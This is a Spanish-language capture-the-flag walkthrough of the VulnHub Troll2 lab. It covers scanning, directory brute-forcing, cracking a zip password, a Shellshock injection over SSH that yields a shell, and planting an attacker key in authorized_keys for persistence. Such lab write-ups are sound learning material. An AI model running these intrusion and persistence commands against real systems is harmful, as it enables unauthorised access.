# VulnHub

## Troll2 (Work in progress)
- Hago un port scan con NMap (nmap -sV -O -n 192168.161.0/24) para ver qué equipos y que puertos/servicios tienen levantados. La máquina Troll1 tiene dos adaptadores y espero encontrar dos IP respondiendo. Pero solo encuentro uno. En una de ellas veo que están levantados los puertos 21 (VSFtpd 2.0.8, vulnerable) y 22 (OpenSSH 5.9p1, vulnerable).
<img width="801" height="255" alt="image" src="https://github.com/user-attachments/assets/17233f55-3631-426e-bf9a-5794d0a45dd4" />
  
- Vemos que efectivamente hay levantado un Web Server en el puerto 80. Utilizando gobuster contra esta dirección IP y pasándole unos cuantos nombres habituales de directorios encuentra varios directorios.

```bash
gobuster dir -u http://192.168.161.140 -w dirs.txt
```

- Dentro de robots.txt encuentro una lista de directorios. Paso esa lista a un fichero y con un bucle en bash recorro cada una de las carpetas y descargo su contenido.  
```bash
while read url; do wget -m -p -k -E -np "http://192.168.161.140$url";done < urls.txt
```
- En varios directorios hay una imagen de un gato. En uno de ellos el fichero es algo mayor que en los demás y se me ocurre que puede haber algo escondido usando alguna forma de esteganografía. Vuelco el contenido de la imagen usando **xxd**.  
<img width="676" height="131" alt="image" src="https://github.com/user-attachments/assets/26a97ec7-27cc-4493-968c-2148abcdb2d2" />

He visto que también se pueden buscar cadenas de texto dentro de ficheros usando la utilidad **strings**.  
- Pruebo a cargar la URL del servidor Web que me sugiere en el fichero **/y0ur_self** y veo que hay un fichero llamado answers.txt que contiene casi 100000 líneas. Cada una de estas líneas contiene un texto cdificado con Base64.
- Paso esa lista a otro fichero y con un bucle en bash decodifico cada una de las cadenas y las guardo en un fichero.

```bash
base64 -d answer.txt > decoded.txt
```  

<img width="1225" height="235" alt="image" src="https://github.com/user-attachments/assets/7d354bb9-112a-473a-a649-c19578d7f522" />

**A partir de aquí me he guiado por algún documento de ayuda. 😓Y cambién a Kali. Es tontería instalar cada herramienta cuando Kali ya las trae. **

- No se me había ocurrido pensar que podía hacer un FTP e intentar con el usuario Tr0ll/Tr0ll.  
<img width="553" height="256" alt="image" src="https://github.com/user-attachments/assets/3a929c66-fa20-4282-9cbe-f9acc1d017e2" />  

- Descargo el fichero ZIP lmao.zip y lo descompacto usando la herramienta **fcrackzip**. Kali no la trae así que tengo que instalarla.
```bash
sudo apt-get install fcrackzip
```
- Utilizo el fichero answers.txt que decodifiqué antes como diccionario.
```bash
fcrackzip lmao.zip -D decoded.txt
```
<img width="493" height="129" alt="image" src="https://github.com/user-attachments/assets/5be4ed54-3e6f-496a-9bdb-a07e640426a2" />  

- Descompacto el fichero con la contraseña y encuentro que contiene el fichero noob que es una clave pública.
<img width="531" height="469" alt="image" src="https://github.com/user-attachments/assets/c1055204-d586-4054-bdd6-5c6cce96f03e" />

- Intento conectarme via SSH pero pasando esta clave pública en lugar de una contraseña. Tengo que pasar el parámetro PubkeyAcceptedKeyTypes para que me acepte la clave.
```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa -i noob noob@192.168.161.140
```
No me deja entrar pero responde. Vamos bien. 

<img width="659" height="128" alt="image" src="https://github.com/user-attachments/assets/ed9f7802-17a8-4156-a218-dc9d25ce50f2" /> 

Si intento conectarme haciendo un verbose veo que hay un *Remote: Forced Command* que suele ser vulnerable a un ataque  Shellshock.

<img width="693" height="291" alt="image" src="https://github.com/user-attachments/assets/e414d7e2-bad6-49ef-b2ed-f6a390af17ce" />

Lo verifico con el siguiente comando. 
```bash
ssh noob@192.168.161.140 -o PubkeyAcceptedKeyTypes=+ssh-rsa -i noob '() { :;}; echo Genaro' 
```
<img width="798" height="124" alt="image" src="https://github.com/user-attachments/assets/7cd13190-676d-45b3-8fe4-aa84457ce51d" />

- Intento aprovecharme de la vulnerabilidad y veo que he abierto una terminal en la máquina remota.
<img width="756" height="455" alt="image" src="https://github.com/user-attachments/assets/74394035-daaf-473b-b9e0-a850e07a9876" />

- Quizá podría seguir en esta terminal, pero he visto que podemos añadir una clave pública para que me deje conectarme con una terminal 'de verdad' desde la máquina atacante. Para ello genero un par de claves en la máquina atacante. Indico la longitud 'minima'.
  
<img width="884" height="488" alt="image" src="https://github.com/user-attachments/assets/921e6209-c9a8-4a0d-89ac-2fef6c69d199" />

- En la máquina atacada añado la clave a la lista de autorizadas.

```bash
echo '*<contenido de nuestro fichero con la clave pública>*' > /home/noob/.ssh/authorized_keys
```
<img width="872" height="118" alt="image" src="https://github.com/user-attachments/assets/c7444108-d3c0-4156-80c6-019a9ba1603f" />

- Ahora ya puedo abrir una sesión directamente desde la máquina atacada.

<img width="690" height="181" alt="image" src="https://github.com/user-attachments/assets/46b664b6-ff27-4ee5-aa1b-38297ef1a624" />



